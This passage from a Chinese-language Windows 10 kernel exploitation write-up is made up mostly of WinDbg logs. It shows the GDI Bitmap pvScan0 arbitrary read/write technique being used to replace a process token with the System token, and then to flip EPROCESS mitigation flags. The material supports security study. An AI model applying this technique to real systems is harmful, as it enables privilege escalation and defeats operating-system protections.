      char v1; // [sp+30h] [bp+8h]@5
      if ( dword_18002E670 == 1 )//dword_18002E670检查是否为1
      {
        result = dword_18002E670;
      }
      else if ( dword_18002E670 == 2 || (v1 = 0, ApiSetQueryApiSetPresence((__int64)L"LN", (__int64)&v1)  p
    GDI32!IsUpdateColorsPresent+0x4://获取dll+0x8位置的值
    0033:00007fff`bd5bfa30 8b0d3aec0100    mov     ecx,dword ptr [GDI32!_hmod__ext_ms_win_gdi_internal_desktop_l1_1_0_dll+0x8 (00007fff`bd5de670)]
    kd> dd 00007fff`bd5de670//这个位置的值为1，后面是dll函数偏移
    00007fff`bd5de670  00000001 00000000 00000000 00000000
    00007fff`bd5de680  ba17ba20 00007fff ba174230 00007fff
    00007fff`bd5de690  ba1765d0 00007fff ba1eafa0 00007fff
    kd> p
    GDI32!IsUpdateColorsPresent+0xa://将这个值和1作比较
    0033:00007fff`bd5bfa36 83f901          cmp     ecx,1
    kd> r ecx
    ecx=1
这个可能是判断ext_ms_win_gdi_internal_desktop_l1.1.0.dll的加载情况，_imp_SetBitMapBits就链在这个dll中，随后会跳转。到zwGdiSetBitmapBits中。
    kd> p //调用_imp_SetBitmapBits函数
    GDI32!SetBitmapBitsStub+0x30:
    0033:00007fff`bd5b44c0 ff15c2be0200    call    qword ptr [GDI32!_imp_SetBitmapBits (00007fff`bd5e0388)]
    kd> t//跳转到NtGdiSetBitmapBits
    gdi32full!SetBitmapBits:
    0033:00007fff`ba17bcf0 48ff2509290900  jmp     qword ptr [gdi32full!_imp_NtGdiSetBitmapBits (00007fff`ba20e600)]
    kd> p
    win32u!ZwGdiSetBitmapBits:
    0033:00007fff`ba2d26f0 4c8bd1          mov     r10,rcx
    //随后会进入ZwGdiSetBitmap
    .text:0000000180003330                 public ZwGdiSetBitmapDimension
    .text:0000000180003330 ZwGdiSetBitmapDimension proc near       ; DATA XREF: .rdata:000000018000A544_x0019_o
    .text:0000000180003330                                         ; .rdata:off_18000C608_x0019_o ...
    .text:0000000180003330                 mov     r10, rcx
    .text:0000000180003333                 mov     eax, 1118h
    .text:0000000180003338                 test    byte ptr ds:7FFE0308h, 1
    .text:0000000180003340                 jnz     short loc_180003345
    .text:0000000180003342                 syscall
    .text:0000000180003344                 retn
syscall是AMD
CPU下的sysenter，以此进入内核层，由于64位下没有nt!KiFastCallEntry，而改用的是nt!KiSystemCall64，在64位系统下启用了四个新的MSR寄存器，有不同的作用，其中MSR_LSTAR保存的是rip的相关信息，可以通过rdmsr
c0000082的方法查看到syscall跳转地址。这个地址正是nt!KiSystemCall64的入口地址。
    kd> rdmsr c0000082
    msr[c0000082] = fffff801`7cb740c0
    nt!KiSystemCall64:
    0033:fffff801`7cb740c0 0f01f8          swapgs
    0033:fffff801`7cb740c3 654889242510000000 mov   qword ptr gs:[10h],rsp
到此，我们进入SetBitmap的内核态，之所以pvScan0这么重要，是因为SetBitmap会对pvScan0指向的内容写数据，GetBitmap会获取pvScan0指向的内容。这样，我们可以设置一个Manager
Bitmap（以下称为M）和一个Work
Bitmap（以下称为W），将M的pvScan0修改成W的pvScan0地址，这样每次就能用在M上调用SetBitmap将W的pvScan0内容修改成我们想要读或者写的地址，再调用Get/Set
Bitmap来向指定地址读取/写入数据了。这么说有点乱，来看一下整个过程。
通过AcceleratorTable制造内存空洞占位获取Bitmap的pkernelAddress之后，可以获取到pvscan0的值，其中M存放W的pvscan0所存放的地址，而W的pvscan0用于最后写入相关的内容，这样我们调用setbitmapbits函数的时候，会将M的pvscan0里存放地址指向的值修改为要写入的地址。
    kd> dq ffffbad383ae9050 L1 // M的pvScan0，现在指向W，这样每次修改，相当                                //于修改W的pvScan0
    ffffbad3`83ac8050  ffffbad3`83aeb050
    kd> dq ffffbad383aeb050 L1//W的pvScan0，所在地址值就是M的pvScan0值
    ffffbad3`83ac8050  ffffe28d`12762af0//要修改的就是这个值，向这个值的内容
    //读取/写入数据
这里就会将ffffbad383aeb050中的值改写，因此在这里下内存写入断点。
    kd> ba w1 ffffbad383aeb050//向W的pvScan0下内存写入断点
    kd> p
    Breakpoint 0 hit
    win32kfull!memmove+0x1cf://中断在win32kfull!memmove函数中
    ffffbab6`0b940f0f 75ef            jne     win32kfull!memmove+0x1c0 (ffffbab6`0b940f00)
    kd> bl
     0 e ffffbad383aeb050 w 1 0001 (0001)
    kd> kb
    RetAddr:ArgstoChild  : Call Site
    ffffbab6`0b88405c : 00000000`00fff8a0 00000000`00000000 00000000`00000a9a ffffbab6`0bbbf1da : win32kfull!memmove+0x1cc
    ffffbab6`0b883e1a : ffffbad3`83ae9000 00000000`00000000 ffffffff`00000008 fffff801`00000704 : win32kfull!bDoGetSetBitmapBits+0x168
    00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kfull!GreSetBitmapBits+0x17a
    kd> dq ffffbad383adc050 L1 //这里会写入新的pvScan0，这个值是当前进程的                                       //token地址
    ffffbad3`83aeb050  ffffe28d`12762b58
    kd> !process 0 0 //查看当前进程
    PROCESS ffffe28d12762800
        SessionId: 1  Cid: 10cc    Peb: 011cb000  ParentCid: 1124
        DirBase: 48d5b000  ObjectTable: ffffa709d16d1640  HandleCount: 
    Image: Stop_by_win10.exe
    kd> dt nt!_EPROCESS Token ffffe28d12762800
       +0x358 Token : _EX_FAST_REF
    kd> dq ffffe28d12762800+358 L1//看看token值，就是pvScan0的值
    ffffe28d`12762b58  ffffa709`d1903996
在Win10中，绝大多数的win32k.sys实现都在win32full里完成，这里利用M的pvScan0完成了对W的pvScan0值的修改，使之指向了当前进程的Token，接下来只需要调用GetBitmap/SetBitmap通过W的pvScan0，就可以完成对Token的读取和修改，从而完成提权。
    kd> !process 0 4 //获取System _EPROCESS结构
    **** NT ACTIVE PROCESS DUMP ****
    PROCESS ffffe28d0f662040
        SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
        DirBase: 001aa000  ObjectTable: ffffa709c88032c0  HandleCount: 
        Image: System
    kd> dq ffffe28d0f662040+358 L1 //得到System  Token值
    ffffe28d`0f662398  ffffa709`c88158ad
    kd> p//调用setBitmap将这个值写入当前进程的地址
    0033:00007ff7`9dd2217f 488bce          mov     rcx,rsi
    kd> g
    Break instruction exception - code 80000003 (first chance)
    0033:00007ff7`9dd222b0 cc              int     3
    kd> !process //当前进程的_EPROCESS
    PROCESS ffffe28d12cb2080
        SessionId: 1  Cid: 0b48    Peb: 0117d000  ParentCid: 1124
        DirBase: 320b6000  ObjectTable: ffffa709d5f84500  HandleCount: 
        Image: Stop_by_win10.exe
    kd> dq ffffe28d12cb2080+358 L1 //利用SetBitmap替换后，当前进程Token变成了                          //System Token，提权完成
    ffffe28d`12cb23d8  ffffa709`c88158ad
我和大家分享了pvScan0在Bitmap这种data
attack中的核心地位，Bitmap的pkernelAddress的获取方法和如何通过pvScan0完成攻击，接下来，我将结合偶像MJ0011的PPT，来讲一下Win10的一些坑，以及回归Win8下来看一下MJ0011的PPT中介绍的一些防护机制，和Bitmap的威力。
**被Win10吊打的日子**
在MJ0011的PPT中介绍了几种防护机制，比如禁零页，禁Win32k调用，SMEP，ExPoolWithTagNX等等。本来刚开始想在Win10下进行实验，但是发现Win10下有很多奇怪的坑。这里简单提一下几种防护机制：
1、禁零页，NtAllocateVirtualMmemory是现在常用的内核漏洞利用手法，Win8
_EPROCESS增加了一比特的Flags.VdmAllowed，当为0时禁用，当为1时可用。
2、禁Win32k，Win32k存在很多漏洞，比如UAF，我在前面两个经典内核漏洞调试的分享中都是Win32k出的问题，这里通过_EPROCESS结构增加一比特的Flags2.DisallowWin32kSystemCalls禁用调用。
3、SMEP，在内核漏洞利用中，通常是利用内核态的一些失误执行用户态申请的空间存放的shellcode，这里直接通过SMEP禁止在内核态执行用户态空间的代码。这里，我将以禁Win32k调用和禁零页来做实验，利用的就是Bitmap来修改这两个比特的值，看看能不能绕过禁用机制，首先来看一下当前进程，以及对应的两个值。
    kd> !process
    PROCESS ffffe28d12cb2080
        SessionId: 1  Cid: 0b48    Peb: 0117d000  ParentCid: 1124
        DirBase: 320b6000  ObjectTable: ffffa709d5f84500  HandleCount: 
        Image: Stop_by_win10.exe
    kd> dt nt!_EPROCESS VdmAllowed ffffe28d12cb2080
       +0x304 VdmAllowed : 0y0//标志位为0，禁用零页
    kd> dt nt!_EPROCESS DisallowWin32kSystemCalls ffffe28d12cb2080
       +0x300 DisallowWin32kSystemCalls : 0y0//标志位为1，默认不禁用Win32k
    kd> dd ffffe28d12cb2080+300 L4 //查看一下Flags2和Flags的值
    ffffe28d`12cb2380  0000d000 144d0c01 a1beb1e1 01d288e0
可以看到，在当前进程Win32k
API是不禁用的，也就是说，我们仍然可以直接调用Win32k的API，而NtAllocateVirtualMemory则处于禁用状态。对于Flags来说是0000d0000，Flags2来说是144d0c01，这样把它们转换成二进制，把对应比特位置换为1（这个内容可以在我的源码中看到），然后赋值给各自的Flags。
    kd> r r13//获取两个Flags值，并且修改比特位之后的值
    r13=a1beb1e1164d0c00